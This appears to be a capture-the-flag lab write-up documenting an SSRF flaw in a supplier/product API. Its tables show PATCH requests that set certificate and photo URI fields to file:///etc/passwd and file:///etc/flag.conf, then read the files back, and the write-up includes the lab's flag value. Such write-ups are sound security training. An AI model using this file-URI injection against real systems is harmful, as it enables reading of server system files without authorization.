# Lab findings — SSRF (CWE-918)

**Target:** `http://154.57.164.65:31687`  
**Date:** 2026-08-02  
**Tools:** curl, OpenAPI DTOs, base64 decode  

## 1) Academy path — certificate URI (p10)

| Item | Detail |
|------|--------|
| Auth | `htbpentester10@pentestercompany.com` |
| Roles | `SupplierCompanies_Update`, `SupplierCompanies_UploadCertificateOfIncorporation` |
| Company | `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be` |
| Write | `PATCH /api/v1/supplier-companies` |
| Body | `UpdatedSupplierCompany.CertificateOfIncorporationPDFFileURI` = `file:///etc/passwd` |
| Read | `GET /api/v1/supplier-companies/{ID}/certificates-of-incorporation` → `base64Data` |
| Result | Decoded `/etc/passwd` (`root:x:0:0:...`) |

Also mass-assignment flavor: URI should only be set by upload POST, not client PATCH.

## 2) Flag path — product photo URI (p11)

| Item | Detail |
|------|--------|
| Auth | `htbpentester11@pentestercompany.com` |
| Roles | includes `Products_CreateByCurrentUser`, `Products_Update` |
| Create | `POST /api/v1/products/current-user` → productID |
| Write | `PATCH /api/v1/products` with `UpdatedProduct.PNGPhotoFileURI` = `file:///etc/flag.conf` |
| Required DTO | `SupplierID`, `ProductID`, `Name`, `Price`, `PNGPhotoFileURI` |
| Read | `GET /api/v1/products/{ProductID}/photo` |
| Decoded | **`HTB{3c94232c4f0b0a544ae4024833eef0b3}`** |

```text
HTB{3c94232c4f0b0a544ae4024833eef0b3}
```

## Evidence

```text
evidence/roles-p10.json
evidence/roles-p11.json
evidence/patch-company-passwd.json
evidence/cert-passwd-b64.json
evidence/passwd-snippet.txt
evidence/create-product-p11.json
evidence/patch-product.json
evidence/photo-flag.json
evidence/flag.conf
evidence/FLAGS.txt
evidence/supplier-p11.json
```

JWTs redacted.

## Operator runbook

[../../execution_batches/07-ssrf.md](../../execution_batches/07-ssrf.md)
